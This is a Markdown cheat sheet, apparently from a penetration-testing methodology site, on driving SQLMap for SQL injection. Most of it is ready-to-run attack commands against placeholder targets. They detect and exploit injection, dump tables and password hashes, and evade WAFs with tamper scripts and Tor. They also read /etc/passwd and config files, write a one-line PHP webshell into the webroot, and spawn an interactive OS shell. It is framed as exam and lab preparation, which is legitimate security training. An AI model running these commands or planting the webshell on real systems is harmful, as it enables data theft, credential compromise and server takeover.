---
title: "SQLMap Essentials"
description: "Automation, tamper scripts, --os-shell, and --dump with SQLMap."
sidebar:
  order: 4
  label: "SQLMap Essentials"
---
> SQLMap automates SQLi detection and exploitation: from fingerprinting to full dumps, file read/write, and OS shells. The Swiss Army knife of SQLi.

---


## Specifying the Request

```bash
# URL with GET parameter
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch

# Complete request from file (saved from Burp)
sqlmap -r req.txt --batch

# POST with inline data
sqlmap -u "http://target/search.php" --data='uid=1&name=test' --batch

# Mark injectable parameter with * (useful in POST)
sqlmap -u "http://target/search.php" --data='uid=1*&name=test' --batch

# Cookie
sqlmap -u "http://target/" --cookie='PHPSESSID=abc123; security=low' --batch

# Custom header
sqlmap -u "http://target/" -H 'X-Forwarded-For: 1.2.3.4' --batch

# Random User-Agent
sqlmap -u "http://target/?id=1" --random-agent --batch

# Emulate mobile device
sqlmap -u "http://target/?id=1" --mobile --batch

# Non-standard HTTP method
sqlmap -u "http://target/?id=1" --method PUT --batch
```

---

## Injection Types (Techniques)

| Code | Type | Description |
|--------|------|-------------|
| `B` | Boolean-based blind | Infer data using T/F response |
| `E` | Error-based | Extract data from error messages |
| `U` | UNION-based | UNION SELECT injection |
| `S` | Stacked queries | Stacked queries chained with `;` |
| `T` | Time-based blind | Infer data using SLEEP() |
| `Q` | Inline queries | Subquery in the original query |

```bash
# Force specific technique (faster)
sqlmap -u "http://target/?id=1" --technique=BEU --batch

# Time-based only (when no visible output)
sqlmap -u "http://target/?id=1" --technique=T --batch
```

---

## Attack Tuning

```bash
# Prefix/suffix for complex context injections
sqlmap -u "http://target/?id=1" --prefix='%')'  --suffix='-- -' --batch

# Test level (1-5, default=1) — higher level = more vectors
sqlmap -u "http://target/?id=1" --level=5 --batch

# Query risk (1-3, default=1) — 3 includes UPDATE/DELETE
sqlmap -u "http://target/?id=1" --risk=3 --batch

# UNION tuning
sqlmap -u "http://target/?id=1" --union-cols=17 --batch      # force number of columns
sqlmap -u "http://target/?id=1" --union-char='a' --batch     # padding char
sqlmap -u "http://target/?id=1" --union-from=users --batch   # FROM table in the UNION

# Debug / troubleshooting
sqlmap -u "http://target/?id=1" --parse-errors --batch       # show SQL errors in output
sqlmap -u "http://target/?id=1" -v 6 --batch                 # maximum verbosity (0-6)
sqlmap -u "http://target/?id=1" -t /tmp/traffic.txt --batch  # save traffic
sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080" --batch  # view in Burp
```

---

## Database Enumeration

```bash
# Fast fingerprint
sqlmap -u "http://target/?id=1" --banner --current-user --current-db --is-dba --batch

# List all databases
sqlmap -u "http://target/?id=1" --dbs --batch

# List tables of a DB
sqlmap -u "http://target/?id=1" --tables -D testdb --batch

# List columns of a table
sqlmap -u "http://target/?id=1" --columns -T users -D testdb --batch

# Complete dump of a table
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --batch

# Dump specific columns
sqlmap -u "http://target/?id=1" --dump -T users -D testdb -C username,password --batch

# Partial dump (rows 2 to 3)
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --start=2 --stop=3 --batch

# Dump with WHERE filter
sqlmap -u "http://target/?id=1" --dump -T users -D testdb --where="name LIKE 'admin%'" --batch

# Dump all DBs (excludes system DBs)
sqlmap -u "http://target/?id=1" --dump-all --exclude-sysdbs --batch

# Complete DB schema
sqlmap -u "http://target/?id=1" --schema --batch

# Search table by name
sqlmap -u "http://target/?id=1" --search -T user --batch

# Search column by name (e.g., columns with "pass")
sqlmap -u "http://target/?id=1" --search -C pass --batch

# Dump DBMS password hashes
sqlmap -u "http://target/?id=1" --passwords --batch
```

---

## Bypassing WAF / Protections

```bash
# CSRF token — specify the token field name
sqlmap -u "http://target/" --data="token=abc&uid=1" --csrf-token="token" --batch

# Randomize parameter per request (anti-cache)
sqlmap -u "http://target/?id=1&rnd=abc" --randomize=rnd --batch

# Python evaluation for dynamic tokens
sqlmap -u "http://target/?id=1" --eval="import hashlib; hash=hashlib.md5(b'1').hexdigest()" --batch

# Tor + connectivity check
sqlmap -u "http://target/?id=1" --tor --check-tor --batch

# Skip automatic WAF detection
sqlmap -u "http://target/?id=1" --skip-waf --batch

# Chunked transfer encoding (WAF body inspection bypass)
sqlmap -u "http://target/?id=1" --chunked --batch

# Combine multiple tamper scripts
sqlmap -u "http://target/?id=1" --tamper=between,randomcase --batch
sqlmap -u "http://target/?id=1" --tamper=space2comment,versionedkeywords --batch

# Real browser User-Agent
sqlmap -u "http://target/?id=1" --random-agent --batch

# List all available tamper scripts
sqlmap --list-tampers
```

### Most Useful Tamper Scripts

| Tamper | Effect | When to Use |
|--------|--------|-------------|
| `between` | `AND` → `BETWEEN 0 AND 1` | Basic WAF filters |
| `randomcase` | `SELECT` → `SeLeCt` | Case-sensitive filters |
| `space2comment` | space → `/**/` | Space filters |
| `space2plus` | space → `+` | Space filters in URL |
| `base64encode` | encodeBase64(payload) | Complete payload encoding |
| `percentage` | `S` → `%53` | WAFs that decode partially |
| `versionedkeywords` | `UNION` → `/*!UNION*/` | MySQL WAFs that filter keywords |
| `modsecurityversioned` | Combines versioned comments | ModSecurity |

---

## OS Exploitation — File Read and Write

```bash
# Verify if we are DBA
sqlmap -u "http://target/?id=1" --is-dba --batch

# Read file from the server
sqlmap -u "http://target/?id=1" --file-read "/etc/passwd" --batch
sqlmap -u "http://target/?id=1" --file-read "/var/www/html/config.php" --batch

# Write webshell to the server
# Create local shell.php first:
# <?php system($_REQUEST[0]); ?>
sqlmap -u "http://target/?id=1" \
  --file-write "shell.php" \
  --file-dest "/var/www/html/shell.php" \
  --batch

# Verify: http://target/shell.php?0=id
```

---

## Interactive OS Shell

```bash
# Interactive OS shell (requires: DBA + FILE priv + writable webroot)
sqlmap -u "http://target/?id=1" --os-shell --batch

# If asked for webroot, specify manually:
# /var/www/html/ (Apache Linux)
# C:/xampp/htdocs/ (Windows XAMPP)
# /usr/share/nginx/html/ (Nginx Linux)

# SQLMap writes a PHP stager + UDF -> interactive shell interface
# Equivalent to a webshell, but managed by sqlmap
```

---

## Key Flags — Quick Reference

| Flag | Description |
|------|-------------|
| `-u URL` | Target URL |
| `-r FILE` | HTTP request from file |
| `--data` | POST data |
| `--batch` | Do not ask user questions (automatic mode) |
| `--cookie` | Send custom cookie |
| `-H` | Additional header |
| `--random-agent` | Random User-Agent |
| `--level` | Test level (1-5) |
| `--risk` | Payload risk (1-3) |
| `--technique` | Techniques: BEUSTQ |
| `--prefix/--suffix` | Injection fine-tuning |
| `--tamper` | Obfuscation script(s) |
| `--proxy` | Proxy to view traffic in Burp |
| `--tor` | Use Tor network |
| `--dbs` | List databases |
| `--tables -D db` | List tables |
| `--dump -T tabla -D db` | Dump table |
| `--dump-all --exclude-sysdbs` | Complete dump without system DBs |
| `--passwords` | DBMS password hashes |
| `--is-dba` | Verify DBA privileges |
| `--file-read` | Read server file |
| `--file-write + --file-dest` | Write file to the server |
| `--os-shell` | Interactive OS shell |
| `--csrf-token` | CSRF field name |
| `--skip-waf` | Skip WAF detection |
| `--parse-errors` | Show SQL errors in output |
| `-v 6` | Maximum verbosity |
| `--list-tampers` | List available tamper scripts |

---

## Pitfalls / Gotchas

- **Always `--batch`:** without `--batch`, sqlmap stops and asks questions at every decision. In an exam, always use `--batch`.
- **`-r req.txt` from Burp:** the request must be in plaintext (Copy as `Raw`). If it has special encoding, detection may fail.
- **`--level 1 --risk 1` (default):** may fail to detect complex injections. If nothing is found with defaults, increase to `--level=5 --risk=3`.
- **UNION column mismatch:** if the app throws a column error, use `--union-cols` to force the correct number.
- **`--os-shell` without DBA:** will fail. Verify `--is-dba` before trying.
- **`--file-write` without webroot:** the file is written but will not be accessible via HTTP. Read the server configuration first to find the real webroot.
- **Non-empty `secure_file_priv`:** `--file-read` and `--file-write` will fail even if we have the FILE privilege. Modern MySQL restricts this by default.
- **WAF without tamper:** if the DB returns strange results or unexpected errors, add `--tamper=between,randomcase` as a starting point.
- **Slow `--tor`:** scans through Tor are very slow. Only for real evasion; in a lab environment use `--proxy` to redirect to Burp.
- **Charset in `--union-char`:** defaults to `NULL`. If the app filters NULL, change to a character: `--union-char='a'`.
- **`--dump` hashes automatically:** if it finds hashes in `password` fields, sqlmap offers to crack them using a dictionary. Answer yes or pass `--batch` (auto-yes).
- **`--search -C pass`:** searches for columns containing "pass" in their name across the entire DB. Extremely useful for finding credential tables without knowing the schema.

---

## Related Cheatsheets

- [SQL Injection Fundamentals](/en/metodologias/web/sql-injection-fundamentals/) — manual SQLi before automating with sqlmap
- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting requests to save them in req.txt
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — alternative webshells post-exploitation of SQLi
- [File Transfers](/en/metodologias/privesc/file-transfers/) — exfiltrating data from the server after compromising via SQLi
- [Password Attacks](/en/metodologias/exploitation/password-attacks/) — cracking hashes extracted with --passwords or --dump
